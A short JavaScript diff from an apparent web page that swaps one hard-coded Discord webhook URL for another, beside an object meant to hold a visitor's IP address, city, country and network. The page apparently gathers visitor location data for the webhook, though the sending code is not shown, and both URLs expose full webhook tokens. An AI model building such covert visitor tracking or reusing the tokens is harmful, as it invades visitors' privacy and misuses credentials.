@@ -10,7 +10,7 @@ const progressFill = document.getElementById('progress-fill');
 const progressText = document.getElementById('progress-text');
 
 const beepSound = new Audio('beep.mp3.wav');
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533628544129957949/EpuXsjlTzIFjNCDSo_paxbaJc6EREqIYxTGIMNJiUm4inVJcRQjXkcBdhInfPZmGtNmx";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533656247113486396/w7x3nd9Zg07eEE2MFSpf42XAvmWZu7_oHaIG0KGVLsSxCmXIQlmmF9p5AtpLbcER9j57";
 
 let ipData = { ip: "Calculando...", city: "Desconocida", country_name: "Desconocido", org: "Local" };
 
